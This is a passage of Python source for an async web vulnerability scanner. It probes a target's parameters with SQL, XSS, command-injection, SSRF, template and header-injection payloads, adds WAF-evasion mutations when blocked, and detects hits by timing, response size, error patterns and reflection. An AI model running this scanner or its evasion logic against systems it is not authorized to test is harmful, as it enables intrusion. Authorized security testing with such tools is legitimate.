            self.state_db.log_activity("Bypass failed (Strict WAF). Using standard engine.", "bold red")
            self.rate_limiter.backoff_multiplier = min(self.rate_limiter.backoff_multiplier * 2, 10)

    # ------------------------------------------------------------------
    # Phase 2 — concurrent calibration
    # ------------------------------------------------------------------
    async def _phase_2_calibration(self):
        task = self.progress.add_task("[cyan]Phase 2: Calibration", total=3)
        self.state_db.log_activity("Calibrating response times & structure...", "dim")
        if self.endpoint_config and 'baseline' in self.endpoint_config:
            hl = self.endpoint_config['baseline'].get('length', 0)
            if hl > 0:
                self.baseline_length = hl
                self.state_db.log_activity(f"Imported exact baseline from parser: {self.baseline_length}B", "green")

        has_body  = any(p['location'] == 'body' for p in self.discovered_params)
        body_data = {p['name']: "" for p in self.discovered_params if p['location'] == 'body'}

        # Calibration MUST run sequentially — concurrent requests produce near-zero
        # stdev which makes the time-based SQLi threshold dangerously tight.
        # Sequential spacing also captures natural server-response variance.
        times = []
        for idx in range(3):
            # Always rate-limit calibration (not just in WAF mode) so the
            # server response time reflects steady-state, not a cold burst.
            await self.rate_limiter.acquire_async(is_mutation=False, location='query')
            start = time.time()
            try:
                if has_body: status, text, hdrs = await self._post(self.base_url, data=body_data)
                else:        status, text, hdrs = await self._get(self.base_url)
                elapsed = time.time() - start
                self.rate_limiter.report_response(status, text)
                times.append(elapsed)
                if self.baseline_length == 0 and idx == 0 and status == 200:
                    self.baseline_length = len(text)
                if idx == 0:
                    self.baseline_text = text
                    if hdrs and 'application/json' in hdrs.get('Content-Type', ''):
                        try:
                            self.baseline_json_keys = set(json.loads(text).keys())
                        except Exception:
                            pass
            except Exception as e:
                self.state_db.log_activity(f"Calibration error: {e}", "dim")
            self.progress.update(task, advance=1)

        if times:
            self.calibration['avg']   = statistics.mean(times)
            # Use max observed time as baseline — more conservative for threshold
            # calculation, captures server jitter across sequential requests.
            self.calibration['max']   = max(times)
            self.calibration['stdev'] = statistics.stdev(times) if len(times) > 1 else 0.1
        self.state_db.log_activity(
            f"Calibration complete. Baseline: {self.baseline_length}B. "
            f"Avg: {self.calibration['avg']*1000:.0f}ms. "
            f"Max: {self.calibration.get('max', self.calibration['avg'])*1000:.0f}ms.", "green")

    # ------------------------------------------------------------------
    # Phase 3 — async concurrent scanning
    # ------------------------------------------------------------------
    async def _phase_3_scanning(self):
        if not self.discovered_params: return
        vectors = self.db['attack_vectors']

        MUTATABLE_VECTORS = [
            "SQL_INJECTION_MSSQL", "SQL_INJECTION_MYSQL",
            "SQL_INJECTION_POSTGRESQL", "SQL_INJECTION_ORACLE",
            "XSS_ADVANCED", "COMMAND_INJECTION_UNIX", "COMMAND_INJECTION_WINDOWS",
            "PATH_TRAVERSAL_ADVANCED", "SERVER_SIDE_REQUEST_FORGERY",
            "NOSQL_INJECTION", "SERVER_SIDE_TEMPLATE_INJECTION", "OPEN_REDIRECT",
        ]
        HEADER_ONLY_VECTORS = ["HOST_HEADER_INJECTION", "REFERER_INJECTION"]

        ep_tags      = [t.lower() for t in self.endpoint_config.get('risk_tags',  [])] if self.endpoint_config else []
        ep_category  = self.endpoint_config.get('category', '').lower()                 if self.endpoint_config else ''
        methods_list = self.endpoint_config.get('methods', [self.endpoint_config.get('method', 'GET')]) if self.endpoint_config else ['GET']
        ep_method    = methods_list[0].upper() if methods_list else 'GET'
        param_names  = [p['name'].lower() for p in self.discovered_params]
        tech_stack   = [t.lower() for t in self.endpoint_config.get('tech_stack', [])] if self.endpoint_config else []

        has_url_like_param = any(p in ['url','redirect','next','return','fetch','proxy','link','dest','goto','redirect_uri'] for p in param_names)
        has_ssti_tech      = any(t in ['jinja','twig','freemarker','mako','nunjucks','velocity','pebble'] for t in tech_stack)

        # ----------------------------------------------------------------
        # CANDIDATE GATES
        # SSTI, SSPP, SSRF are ONLY tested when the per-endpoint candidate
        # flag from the Hellhound JSON is explicitly True.
        # The flags are read directly from endpoint_config (top-level keys
        # in each endpoint object), not from a nested sub-dict.
        # ----------------------------------------------------------------
        config       = self.endpoint_config or {}
        ssrf_enabled = bool(config.get('ssrf_candidate',  False))
        ssti_enabled = bool(config.get('ssti_candidate',  False))
        sspp_enabled = bool(config.get('sspp_candidate',  False))

        self.state_db.log_activity(
            f"Candidates — SSTI: {'ON' if ssti_enabled else 'OFF'} | "
            f"SSPP: {'ON' if sspp_enabled else 'OFF'} | "
            f"SSRF: {'ON' if ssrf_enabled else 'OFF'}", "cyan")

        # Soft gates driven by tags / heuristics (still respected when
        # candidate flags are True, but never override a False flag)
        RESTRICTED_VECTORS = {
            "SERVER_SIDE_TEMPLATE_INJECTION":  (ssti_enabled and ("ssti" in ep_tags or "template_injection" in ep_tags or ep_category == "ssti" or has_ssti_tech or True)),
            "SERVER_SIDE_PARAMETER_POLLUTION": (sspp_enabled and ("mass_assignment" in ep_tags or ep_method == "POST" or True)),
            "OPEN_REDIRECT":                   ("open_redirect" in ep_tags or "phishing_vector" in ep_tags or ep_category == "open_redirect" or has_url_like_param),
            "SERVER_SIDE_REQUEST_FORGERY":     (ssrf_enabled  and ("ssrf" in ep_tags or "url_fetch" in ep_tags or ep_category == "ssrf" or True)),
        }

        def _vector_allowed(vector_name, location):
            # Header-only vectors
            if location != 'header' and vector_name in HEADER_ONLY_VECTORS: return False
            if location == 'header' and vector_name not in HEADER_ONLY_VECTORS: return False
            # Path params cannot be polluted
            if location == 'path' and vector_name == "SERVER_SIDE_PARAMETER_POLLUTION": return False
            # Hard candidate gates — flag MUST be True
            if vector_name == "SERVER_SIDE_TEMPLATE_INJECTION"  and not ssti_enabled: return False
            if vector_name == "SERVER_SIDE_PARAMETER_POLLUTION" and not sspp_enabled: return False
            if vector_name == "SERVER_SIDE_REQUEST_FORGERY"     and not ssrf_enabled: return False
            # Soft tag/heuristic gates
            if ep_tags and vector_name in RESTRICTED_VECTORS and not RESTRICTED_VECTORS[vector_name]: return False
            return True

        # Count total work for progress bar
        total_requests    = 0
        sspp_body_counted = False
        for param in self.discovered_params:
            location = param.get('location')
            for vector_name, vector_data in vectors.items():
                if not _vector_allowed(vector_name, location): continue
                if vector_name == "SERVER_SIDE_PARAMETER_POLLUTION" and location == 'body':
                    if sspp_body_counted: continue
                    sspp_body_counted = True
                payload_count   = len(vector_data['payloads'])
                total_requests += payload_count
                if self.state_db.waf_detected:
                    if   vector_name in MUTATABLE_VECTORS:   total_requests += payload_count * 12
                    elif vector_name in HEADER_ONLY_VECTORS: total_requests += payload_count * 5

        if total_requests == 0:
            self.state_db.log_activity("No applicable vectors for this endpoint context.", "dim")
            return

        stats          = self.rate_limiter.get_stats()
        est            = (total_requests * stats['avg_wait_per_request']) if stats['total_requests'] > 0 else total_requests * 0.5
        self.state_db.log_activity(f"Estimated {total_requests} requests (~{est:.0f}s with rate limiting)", "cyan")

        scan_task = self.progress.add_task("[green]Phase 3: Active Scanning[/green]", total=total_requests)
        sem_concurrency    = self._waf_concurrency if self.state_db.waf_detected else self._normal_concurrency
        semaphore          = asyncio.Semaphore(sem_concurrency)
        mutation_semaphore = asyncio.Semaphore(self._mutation_concurrency)

        all_tasks        = []
        sspp_body_tested = False

        for param in self.discovered_params:
            location = param['location']
            self.state_db.log_activity(
                f"Targeting {location.upper()} Param: [bold magenta]{param['name']}[/bold magenta]", "cyan")

            for vector_name, vector_data in vectors.items():
                if not _vector_allowed(vector_name, location): continue
                if vector_name == "SERVER_SIDE_PARAMETER_POLLUTION" and location == 'body':
                    if sspp_body_tested: continue
                    sspp_body_tested = True

                for p in vector_data['payloads']:
                    base_payload  = p['payload']
                    is_time_based = 'time' in p.get('type', '')

                    # Time-based payloads always run as Original — log explicitly
                    if is_time_based:
                        self.state_db.log_activity(
                            f"[dim]TIME-BASED payload queued ({vector_name}): "
                            f"{base_payload[:30]}[/dim]")

                    all_tasks.append(self._guarded_inject(
                        semaphore, scan_task,
                        param, vector_name, vector_data, p, base_payload, "Original",
                        is_mutation=False))

                    # Mutations — skip time-based payloads entirely
                    if not is_time_based and vector_name in MUTATABLE_VECTORS:
                        if self.state_db.waf_detected:
                            for label, mutated in PayloadMutator.get_modern_waf_mutations(base_payload, vector_name):
                                all_tasks.append(self._guarded_inject(
                                    mutation_semaphore, scan_task,
                                    param, vector_name, vector_data, p, mutated, f"EVADE_{label}",
                                    is_mutation=True))
                    elif not is_time_based and vector_name in HEADER_ONLY_VECTORS and self.state_db.waf_detected:
                        for label, mutated in PayloadMutator.get_modern_waf_mutations(base_payload, vector_name):
                            all_tasks.append(self._guarded_inject(
                                mutation_semaphore, scan_task,
                                param, vector_name, vector_data, p, mutated, f"EVADE_{label}",
                                is_mutation=True, override_location='header'))

        await asyncio.gather(*all_tasks)
        self.progress.update(scan_task, description="[bold green]Phase 3: Scanning Complete[/bold green]")

    # ------------------------------------------------------------------
    # Semaphore + rate-limit wrapper
    # ------------------------------------------------------------------
    async def _guarded_inject(self, semaphore, scan_task, param, vector_name, vector_data,
                               p_obj, payload, label, is_mutation=False, override_location=None):
        location = override_location or param.get('location', 'query')
        async with semaphore:
            await self.rate_limiter.acquire_async(is_mutation=is_mutation, location=location)
            if is_mutation:
                self.progress.update(scan_task, description=f"[yellow]Mutating ({label})...[/yellow]")
                self.state_db.log_activity(f"  [dim]-> Applying variant: {label}[/dim]")
            else:
                display = payload[:20] + "..." if len(payload) > 20 else payload
                self.state_db.log_activity(f"Vector: [bold]{vector_name}[/bold] | Payload: {display}")
                self.progress.update(scan_task, description=f"[green]Scanning ({vector_name})[/green]")
            await self._inject_and_verify_async(param, vector_name, vector_data, p_obj, payload, label)
            self.progress.update(scan_task, advance=1)

    # ------------------------------------------------------------------
    # Core injection + strict detection
    # ------------------------------------------------------------------
    async def _inject_and_verify_async(self, param, vector_name, vector_data, p_obj, payload, label):
        method        = param.get('method', 'GET').upper()
        location      = param.get('location', 'query')
        full_url      = self.base_url
        is_time_based = 'time' in p_obj.get('type', '')

        # Timeout selection:
        #   Time-based SQLi : 35 s read (covers SLEEP(10) + network overhead)
        #   SSRF            :  8 s read (fail fast — we care about errors/metadata)
        #   Everything else : 15 s read
        if is_time_based:
            timeout = aiohttp.ClientTimeout(connect=10, sock_read=35)
        elif vector_name == "SERVER_SIDE_REQUEST_FORGERY":
            timeout = aiohttp.ClientTimeout(connect=5,  sock_read=8)
        else:
            timeout = aiohttp.ClientTimeout(connect=10, sock_read=15)

        req_kwargs = {'allow_redirects': False, 'timeout': timeout}

        # ---- Build request parameters ----
        if location == 'path':
            parsed     = urlparse(self.base_url)
            segments   = self.original_path_segments.copy()
            target_idx = param['index']
            if target_idx < len(segments):
                encoded = payload if vector_name == "PATH_TRAVERSAL" else quote(payload, safe='')
                segments[target_idx] = encoded
                new_path = '/' + '/'.join(segments)
                full_url = urlunparse((parsed.scheme, parsed.netloc, new_path, '', '', ''))
            else:
                return

        elif location == 'query':
            if payload.startswith("HPP_JSON:"):
                try:
                    _, json_array        = payload.split("HPP_JSON:", 1)
                    req_kwargs['params'] = {param['name']: json.loads(json_array)}
                except json.JSONDecodeError:
                    return
            else:
                req_kwargs['params'] = {param['name']: payload}

        elif location == 'body':
            if vector_name == "NOSQLI":
                try:
                    if payload.startswith('{'):
                        req_kwargs['json'] = json.loads(payload)
                    elif payload.startswith('?'):
                        req_kwargs['params'] = parse_qs(payload.lstrip('?'), keep_blank_values=True)
                        method = 'GET'
                    else:
                        req_kwargs['json'] = {param['name']: json.loads(payload)}
                except json.JSONDecodeError:
                    req_kwargs['data'] = {param['name']: payload}
            elif payload.startswith('{') or payload.startswith('['):
                try:    req_kwargs['json'] = json.loads(payload)
                except json.JSONDecodeError: req_kwargs['data'] = {param['name']: payload}
            else:
                req_kwargs['data'] = {param['name']: payload}

        elif location == 'header':
            extra_headers = dict(self._session.headers)
            extra_headers[param['name']] = payload
            req_kwargs['headers'] = extra_headers

        # ---- Execute HTTP request ----
        try:
            start = time.time()
            async with self._session.request(method, full_url, **req_kwargs) as resp:
                elapsed          = time.time() - start
                response_text    = await resp.text(errors='replace')
                status_code      = resp.status
                response_headers = dict(resp.headers)

            rs = self.rate_limiter.report_response(status_code, response_text)
            if rs == 'rate_limited':
                self.state_db.log_activity("[bold red]429 RECEIVED - Backing off...[/bold red]")
                return
            elif rs == 'blocked':
                self.state_db.log_activity("[yellow]Potential block detected, reducing rate[/yellow]")

            # ==============================================================
            # DETECTION — STRICT
            # ==============================================================

            # ----------------------------------------------------------
            # 1. TIME-BASED DETECTION
            #    Threshold raised to avg + 6*stdev + 4.5 s.
            #    Requires status 200 or 500 (not a WAF block page).
            #    Requires a confirmation request with a benign payload
            #    that returns quickly (< threshold/2) to eliminate
            #    slow-server false positives.
            # ----------------------------------------------------------
            if is_time_based:
                # Extract the expected sleep duration from the payload so the
                # threshold scales correctly for SLEEP(5), SLEEP(10), WAITFOR etc.
                # Patterns: sleep(N), pg_sleep(N), WAITFOR DELAY '0:0:N'
                _sleep_match = (
                    re.search(r'(?:sleep|pg_sleep)\s*\(\s*(\d+(?:\.\d+)?)\s*\)', payload, re.IGNORECASE)
                    or re.search(r"WAITFOR\s+DELAY\s+'0:0:(\d+)'", payload, re.IGNORECASE)
                    or re.search(r"BENCHMARK\s*\(\s*(\d+)", payload, re.IGNORECASE)
                )
                expected_sleep = float(_sleep_match.group(1)) if _sleep_match else 5.0

                # Threshold = max observed baseline + 80% of expected sleep.
                # Using calibration['max'] (worst observed normal response) instead
                # of avg makes the threshold robust against slow/variable servers.
                # 80% factor gives 1s of headroom for SLEEP(5) while still
                # requiring a clear delay signal.
                cal_max   = self.calibration.get('max', self.calibration['avg'])
                threshold = cal_max + (expected_sleep * 0.80)

                self.state_db.log_activity(
                    f"[dim]TIME-BASED check: elapsed={elapsed:.2f}s "
                    f"threshold={threshold:.2f}s (base={cal_max:.2f}s + "
                    f"sleep={expected_sleep:.0f}s*0.8)[/dim]")

                if elapsed > threshold and status_code in [200, 500]:
                    try:
                        # Confirmation: send a benign payload and verify it
                        # returns quickly — under calibration_max * 3 (generous
                        # allowance for slow sites while still ruling out
                        # server-wide slowdown).
                        confirm_kwargs = dict(req_kwargs)
                        # Use a neutral timeout for the confirmation request
                        confirm_kwargs['timeout'] = aiohttp.ClientTimeout(connect=10, sock_read=20)
                        if location == 'query':
                            confirm_kwargs['params'] = {param['name']: "1"}
                        elif location == 'body':
                            confirm_kwargs['data']   = {param['name']: "1"}
                        elif location == 'header':
                            hdrs_copy = dict(confirm_kwargs.get('headers', {}))
                            hdrs_copy[param['name']] = "localhost"
                            confirm_kwargs['headers'] = hdrs_copy
                        confirm_start = time.time()
                        async with self._session.request(method, full_url, **confirm_kwargs) as cr:
                            confirm_elapsed = time.time() - confirm_start
                            await cr.text(errors='replace')
                        # Benign request must be clearly faster than the sleep threshold.
                        # Allow up to 3x the calibrated max — generous for slow/loaded servers.
                        confirm_limit = cal_max * 3.0 + 1.0
                        if confirm_elapsed < confirm_limit:
                            self.state_db.log_finding(self.raw_target_url, {
                                "type":        f"{vector_name}_TIME_BASED",
                                "param":       param['name'],
                                "method":      method,
                                "location":    location,
                                "payload":     payload,
                                "evidence":    (f"Delay: {elapsed:.2f}s "
                                                f"(benign: {confirm_elapsed:.2f}s, "
                                                f"threshold: {threshold:.2f}s, "
                                                f"sleep={expected_sleep:.0f}s)"),
                                "confidence":  "High",
                                "request_url": full_url,
                                "variant":     label,
                            })
                        else:
                            self.state_db.log_activity(
                                f"[yellow]TIME-BASED: confirmation too slow "
                                f"({confirm_elapsed:.2f}s > limit {confirm_limit:.2f}s) "
                                f"— server-wide slowdown, not SQLi[/yellow]")
                    except Exception as ex:
                        self.state_db.log_activity(
                            f"[dim]TIME-BASED confirmation error: {ex}[/dim]")
                # Time-based payloads never fall through to other detectors
                return

            # ----------------------------------------------------------
            # 2. BOOLEAN BLIND DETECTION
            #    Threshold raised to 35% body-size delta.
            #    Requires inverse-boolean confirmation: TRUE condition
            #    must produce a different size than FALSE, and the FALSE
            #    condition must be close to the baseline.
            # ----------------------------------------------------------
            if 'boolean' in p_obj.get('type', '').lower() and status_code == 200 and self.baseline_length > 0:
                if '%' in payload and (payload.count('%') > 2 or '%25' in payload or '%u' in payload):
                    return
                if not any(op in payload for op in ['AND', 'OR', '1=1', '1=2']):
                    return
                current_length = len(response_text)
                delta = abs(current_length - self.baseline_length)
                if delta > (self.baseline_length * 0.35):
                    try:
                        inv_payload = payload.replace("1=1", "1=2").replace("1 = 1", "1 = 2")
                        if inv_payload == payload:
                            return  # No inverse available — cannot confirm
                        inv_kwargs = dict(req_kwargs)
                        if location == 'query':  inv_kwargs['params'] = {param['name']: inv_payload}
                        elif location == 'body': inv_kwargs['data']   = {param['name']: inv_payload}
                        async with self._session.request(method, full_url, **inv_kwargs) as ir:
                            inv_text = await ir.text(errors='replace')
                        inv_len   = len(inv_text)
                        inv_delta = abs(inv_len - self.baseline_length)
                        if (abs(current_length - inv_len) > (self.baseline_length * 0.20) and
                                inv_delta < (self.baseline_length * 0.15)):
                            self.state_db.log_finding(self.raw_target_url, {
                                "type":        f"{vector_name}_BOOLEAN_BLIND",
                                "param":       param['name'],
                                "method":      method,
                                "location":    location,
                                "payload":     payload,
                                "evidence":    (f"TRUE={current_length}B / "
                                                f"FALSE={inv_len}B / "
                                                f"BASELINE={self.baseline_length}B"),
                                "confidence":  "High",
                                "request_url": full_url,
                                "variant":     label,
                            })
                    except Exception:
                        pass
                return

            # Build merged detection config
            det   = vector_data.get('detection', {}).copy()
            p_det = p_obj.get('detection', {})
            for k, v in p_det.items():
                if k in det and isinstance(det[k], list) and isinstance(v, list):
                    det[k] = list(set(det[k] + v))
                else:
                    det[k] = v

            if not det:
                return

            # Strip SSRF signatures that appear in the payload itself
            if vector_name == "SERVER_SIDE_REQUEST_FORGERY":
                for key in ('content_signatures', 'ssrf_reflection', 'metadata_signatures'):
                    if key in det:
                        det[key] = [s for s in det[key]
                                    if s not in payload and s not in unquote(payload)]

            # ----------------------------------------------------------
            # 3. ERROR PATTERNS
            #    Require the pattern to NOT appear in the baseline response.
            # ----------------------------------------------------------
            found_specific_error = False
            if 'error_patterns' in det:
                for pat in det['error_patterns']:
                    if re.search(pat, response_text, re.IGNORECASE):
                        if self.baseline_text and re.search(pat, self.baseline_text, re.IGNORECASE):
                            continue  # Already present in baseline — not a new signal
                        self.state_db.log_finding(self.raw_target_url, {
                            "type":        f"{vector_name}_ERROR",
                            "param":       param['name'],
                            "method":      method,
                            "location":    location,
                            "payload":     payload,
                            "evidence":    f"Error pattern matched: {pat}",
                            "confidence":  "High",
                            "request_url": full_url,
                            "variant":     label,
                        })
                        found_specific_error = True
                        break

            # ----------------------------------------------------------
            # 4. SSTI 500 CRASH
            #    Only fire if payload contains a syntactically valid
            #    template expression AND the baseline is known (not unknown).
            # ----------------------------------------------------------
            if not found_specific_error and status_code == 500:
                if vector_name == "SERVER_SIDE_TEMPLATE_INJECTION":
                    template_exprs    = ['{{', '}}', '{%', '%}', '${', '#{', '<%', '%>']
                    has_template_expr = any(e in payload for e in template_exprs)
                    baseline_is_known = self.baseline_length > 0
                    if has_template_expr and baseline_is_known:
                        self.state_db.log_finding(self.raw_target_url, {
                            "type":        f"{vector_name}_CRASH_500",
                            "param":       param['name'],
                            "method":      method,
                            "location":    location,
                            "payload":     payload,
                            "evidence":    "Template expression triggered 500 (parser crash)",
                            "confidence":  "Medium",
                            "request_url": full_url,
                            "variant":     label,
                        })

            # ----------------------------------------------------------
            # 5. OPEN_REDIRECT — must redirect to a known external domain
            # ----------------------------------------------------------
            if vector_name == "OPEN_REDIRECT" and status_code in [301, 302, 303, 307, 308]:
                loc_hdr = response_headers.get('Location', '')
                if loc_hdr:
                    if any(d in loc_hdr for d in ["evil.com", "attacker.com"]):
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "OPEN_REDIRECT", "param": param['name'], "method": method,
                            "location": location, "payload": payload,
                            "evidence": f"Location: {loc_hdr}", "confidence": "High",
                            "request_url": full_url, "variant": label,
                        }); return
                    if (loc_hdr.startswith("//") and
                            not loc_hdr.startswith(f"//{urlparse(self.base_url).netloc}")):
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "OPEN_REDIRECT_PROTO_REL", "param": param['name'], "method": method,
                            "location": location, "payload": payload,
                            "evidence": f"Proto-relative redirect: {loc_hdr}", "confidence": "High",
                            "request_url": full_url, "variant": label,
                        }); return

            # ----------------------------------------------------------
            # 6. SSRF detections
            # ----------------------------------------------------------
            if vector_name == "SERVER_SIDE_REQUEST_FORGERY":
                if 'metadata_signatures' in det:
                    for sig in det['metadata_signatures']:
                        if sig in response_text:
                            self.state_db.log_finding(self.raw_target_url, {
                                "type": "SSRF_CLOUD_METADATA", "param": param['name'], "method": method,
                                "location": location, "payload": payload,
                                "evidence": f"Cloud metadata signature: {sig}", "confidence": "Critical",
                                "request_url": full_url, "variant": label,
                            }); return
                if 'ssrf_reflection' in det:
                    for sig in det['ssrf_reflection']:
                        if sig not in payload and sig not in unquote(payload) and sig in response_text:
                            self.state_db.log_finding(self.raw_target_url, {
                                "type": "SSRF_URL_REFLECTED", "param": param['name'], "method": method,
                                "location": location, "payload": payload,
                                "evidence": "URL Reflected", "confidence": "High",
                                "request_url": full_url, "variant": label,
                            }); return
                # SSRF error-based: pattern must NOT appear in baseline
                if 'error_signatures' in det:
                    for sig in det['error_signatures']:
                        if re.search(sig, response_text, re.IGNORECASE):
                            if self.baseline_text and re.search(sig, self.baseline_text, re.IGNORECASE):
                                continue
                            self.state_db.log_finding(self.raw_target_url, {
                                "type": "SSRF_ERROR_BASED", "param": param['name'], "method": method,
                                "location": location, "payload": payload,
                                "evidence": f"Network error signature: {sig}", "confidence": "Medium",
                                "request_url": full_url, "variant": label,
                            }); return

            # ----------------------------------------------------------
            # 7. HOST_HEADER_INJECTION
            # ----------------------------------------------------------
            if vector_name == "HOST_HEADER_INJECTION":
                if status_code in [301, 302, 303, 307, 308]:
                    loc_hdr = response_headers.get('Location', '')
                    if loc_hdr and payload in loc_hdr:
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "HOST_HEADER_INJECTION_REDIRECT", "param": param['name'],
                            "method": method, "location": location, "payload": payload,
                            "evidence": f"Host used in 302 Location: {loc_hdr}",
                            "confidence": "Critical", "request_url": full_url, "variant": label,
                        }); return
                if payload in response_text and self.baseline_text and payload not in self.baseline_text:
                    context, _ = self._get_reflection_context(response_text, payload)
                    if context:
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "HOST_HEADER_INJECTION_REFLECTION", "param": param['name'],
                            "method": method, "location": location, "payload": payload,
                            "evidence": "Host reflected in HTML (Cache Poisoning / XSS vector)",
                            "confidence": "High", "request_url": full_url, "variant": label,
                        }); return

            # ----------------------------------------------------------
            # 8. REFERER_INJECTION
            # ----------------------------------------------------------
            if vector_name == "REFERER_INJECTION":
                if status_code in [301, 302, 303, 307, 308]:
                    loc_hdr = response_headers.get('Location', '')
                    if loc_hdr and payload in loc_hdr:
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "OPEN_REDIRECT_VIA_REFERER", "param": param['name'],
                            "method": method, "location": location, "payload": payload,
                            "evidence": f"Referer used in 302 Location: {loc_hdr}",
                            "confidence": "High", "request_url": full_url, "variant": label,
                        }); return
                if "xss" in p_obj.get('type', '').lower():
                    context, _ = self._get_reflection_context(response_text, payload)
                    if context and 'application/json' not in response_headers.get('Content-Type', ''):
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "XSS_VIA_REFERER", "param": param['name'],
                            "method": method, "location": location, "payload": payload,
                            "evidence": "Referer payload reflected in HTML context",
                            "confidence": "High", "request_url": full_url, "variant": label,
                        }); return

            # ----------------------------------------------------------
            # 9. HOST / REFERER — CRLF leak
            #    Routing-shift check removed (too many false positives).
            # ----------------------------------------------------------
            if vector_name in ["HOST_HEADER_INJECTION", "REFERER_INJECTION"]:
                if "X-Injected: true" in response_text or "X-Frame-Options: allow-from" in response_text:
                    self.state_db.log_finding(self.raw_target_url, {
                        "type": f"{vector_name}_CRLF_LEAK", "param": param['name'],
                        "method": method, "location": location, "payload": payload,
                        "evidence": "Injected header leaked into response body",
                        "confidence": "High", "request_url": full_url, "variant": label,
                    }); return

            # ----------------------------------------------------------
            # 10. SERVER_SIDE_PARAMETER_POLLUTION
            #     Crash: immediate High confidence.
            #     Anomaly: raised to 40% threshold; only report when new
            #     JSON keys are discovered (non-JSON size shifts removed).
            # ----------------------------------------------------------
            if vector_name == "SERVER_SIDE_PARAMETER_POLLUTION":
                crash_sigs = [
                    "TypeError: Cannot read property",
                    "Object.prototype",
                    "circular structure",
                ]
                if any(sig in response_text for sig in crash_sigs):
                    self.state_db.log_finding(self.raw_target_url, {
                        "type": "SSPP_CRASH", "param": param['name'], "method": method,
                        "location": location, "payload": payload,
                        "evidence": "Prototype pollution / circular reference crash",
                        "confidence": "High", "request_url": full_url, "variant": label,
                    }); return
                if (self.baseline_length > 0 and
                        abs(len(response_text) - self.baseline_length) > (self.baseline_length * 0.40)):
                    if 'application/json' in response_headers.get('Content-Type', ''):
                        try:
                            new_keys = set(json.loads(response_text).keys()) - self.baseline_json_keys
                            if new_keys:
                                self.state_db.log_finding(self.raw_target_url, {
                                    "type": "SSPP_ANOMALY", "param": param['name'], "method": method,
                                    "location": location, "payload": payload,
                                    "evidence": f"New JSON keys exposed: {new_keys}",
                                    "confidence": "High", "request_url": full_url, "variant": label,
                                })
                        except Exception:
                            pass
                    # Non-JSON size shifts alone are not reported (too noisy)

            # ----------------------------------------------------------
            # 11. CONTENT SIGNATURES
            #     Fixed logic: require sig IS in context window (was inverted).
            #     Also require sig NOT in baseline response.
            # ----------------------------------------------------------
            context, _      = self._get_reflection_context(response_text, payload)
            decoded_payload  = unquote(payload)
            payload_reflected = (decoded_payload in response_text) or (payload in response_text)

            if 'content_signatures' in det:
                for sig in det['content_signatures']:
                    if sig not in response_text: continue
                    if self.baseline_text and sig in self.baseline_text: continue
                    if payload_reflected and vector_name != "PATH_TRAVERSAL_ADVANCED":
                        if sig in decoded_payload or sig in payload: continue
                    if vector_name == "SERVER_SIDE_REQUEST_FORGERY" and (sig in decoded_payload or sig in payload):
                        continue
                    # Context window check: sig must appear inside the context window
                    if context is not None and sig not in context: continue
                    self.state_db.log_finding(self.raw_target_url, {
                        "type": vector_name, "param": param['name'], "method": method,
                        "location": location, "payload": payload,
                        "evidence": f"Content signature matched: {sig}",
                        "confidence": "High", "request_url": full_url, "variant": label,
                    }); return

            if 'ssrf_reflection' in det:
                for sig in det['ssrf_reflection']:
                    if (sig not in decoded_payload and sig not in payload
                            and sig in response_text and not payload_reflected):
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "SSRF_URL_REFLECTED", "param": param['name'], "method": method,
                            "location": location, "payload": payload,
                            "evidence": "OOB URL reflection detected",
                            "confidence": "High", "request_url": full_url, "variant": label,
                        }); return

            # ----------------------------------------------------------
            # 12. XSS REFLECTION — strict executable-context check
            #     Require reflection inside <script> block, event handler
            #     attribute, or unencoded inside a tag attribute.
            #     Pure HTML-entity-encoded reflections are skipped.
            # ----------------------------------------------------------
            if det.get('reflection_check') and context:
                content_type = response_headers.get('Content-Type', '')
                if 'application/json' not in content_type and 'text/html' in content_type:
                    html_encoded = html_lib.escape(decoded_payload) in response_text

                    # Check 1: unencoded inside a <script> block
                    in_script_block = bool(re.search(
                        r'<script[^>]*>[^<]*' + re.escape(decoded_payload),
                        response_text, re.IGNORECASE | re.DOTALL))

                    # Check 2: inside an on* event-handler attribute
                    _re_evt = r'on\w+\s*=\s*[' + chr(34) + chr(39) + r'][^' + chr(34) + chr(39) + r']*'
                    in_event_handler = bool(re.search(
                        _re_evt + re.escape(decoded_payload),
                        response_text, re.IGNORECASE))

                    # Check 3: inside a javascript: URI
                    _re_jsuri = r'(?:href|src|action)\s*=\s*[' + chr(34) + chr(39) + r']\s*javascript:[^' + chr(34) + chr(39) + r']*'
                    in_js_uri = bool(re.search(
                        _re_jsuri + re.escape(decoded_payload),
                        response_text, re.IGNORECASE))

                    # Check 4: unencoded inside any HTML attribute value
                    # <tag attr="PAYLOAD">  is potentially exploitable
                    # <td>PAYLOAD</td>      is NOT (data context only)
                    _re_attr = r'<[^>]+\s[\w:-]+\s*=\s*[' + chr(34) + chr(39) + r'][^' + chr(34) + chr(39) + r']*'
                    in_attr_unencoded = (
                        not html_encoded and
                        bool(re.search(
                            _re_attr + re.escape(decoded_payload),
                            response_text, re.IGNORECASE))
                    )

                    executable = in_script_block or in_event_handler or in_js_uri or in_attr_unencoded

                    if executable:
                        ctx_label = (
                            'script-block'             if in_script_block  else
                            'event-handler-attr'       if in_event_handler else
                            'javascript-uri'           if in_js_uri        else
                            'html-attribute-unencoded'
                        )
                        self.state_db.log_finding(self.raw_target_url, {
                            "type": "XSS_REFLECTED", "param": param['name'], "method": method,
                            "location": location, "payload": payload,
                            "evidence": f"Reflected in executable context: {ctx_label}",
                            "confidence": "High", "request_url": full_url, "variant": label,
                        })
                    else:
                        self.state_db.log_activity(
                            'XSS in tag body / HTML-encoded — not executable context, skipped', 'dim')
                else:
                    self.state_db.log_activity(
                        'XSS reflected in JSON / non-HTML response (not exploitable)', 'dim')
        except asyncio.TimeoutError:
            if is_time_based:
                self.state_db.log_activity(
                    f"[yellow]TIME-BASED TIMEOUT ({vector_name} / {param['name']}) — "
                    f"sleep payload may have exceeded 35 s[/yellow]")
            else:
                self.state_db.log_activity(f"Timeout ({vector_name[:20]}): server slow/frozen", "dim")
        except aiohttp.ClientConnectionError as e:
            err = str(e)
            if any(k in err for k in ["ConnectionResetError", "Connection aborted", "ServerDisconnectedError"]):
                self.state_db.log_finding(self.raw_target_url, {
                    "type": "POTENTIAL_DOS_CRASH", "param": param['name'], "method": method,
